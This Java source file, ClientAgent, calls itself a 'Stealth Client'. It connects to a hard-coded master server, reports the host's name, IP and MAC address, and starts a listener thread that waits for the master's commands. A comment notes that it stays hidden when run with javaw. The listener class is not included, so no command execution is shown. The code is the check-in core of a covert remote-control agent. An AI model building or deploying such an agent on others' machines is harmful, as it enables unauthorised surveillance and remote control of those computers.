package client;

import java.io.*;
import java.net.*;
import java.util.*;

public class ClientAgent {
    public static void main(String[] args) {
        try {
            // Print to console (only visible if run with java, not javaw)
            System.out.println("Stealth Client: Starting...");

            // Connect to the master server
            String masterIP = "10.1.50.135"; // Change to Master’s IP if needed
            int masterPort = 9090;
            Socket socket = new Socket(masterIP, masterPort);
            System.out.println("Connected to Master at " + masterIP + ":" + masterPort);

            // Send host details to master
            PrintWriter out = new PrintWriter(socket.getOutputStream(), true);
            String host = InetAddress.getLocalHost().getHostName();
            String ip = InetAddress.getLocalHost().getHostAddress();
            String mac = getMac();
            out.println(host + " | " + ip + " | " + mac);

            // Start listening for commands from master
            new Thread(new CommandListener(socket)).start();

            // Keep running (main thread sleeps forever)
            while (true) {
                try {
                    Thread.sleep(Long.MAX_VALUE);
                } catch (InterruptedException ignored) {
                }
            }
        } catch (IOException e) {
            // Log exceptions to a file for debugging
            logError(e);
        } catch (Exception e) {
            throw new RuntimeException(e);
        }
    }

    private static String getMac() throws Exception {
        InetAddress ip = InetAddress.getLocalHost();
        NetworkInterface ni = NetworkInterface.getByInetAddress(ip);
        byte[] mac = ni.getHardwareAddress();
        StringBuilder sb = new StringBuilder();
        for (byte b : mac) sb.append(String.format("%02X:", b));
        return sb.substring(0, sb.length() - 1);
    }

    private static void logError(Exception e) {
        try (PrintWriter pw = new PrintWriter(new FileWriter("client_error.log", true))) {
            pw.println(new Date() + ": " + e.getMessage());
            e.printStackTrace(pw);
        } catch (IOException ignored) {
        }
    }
}
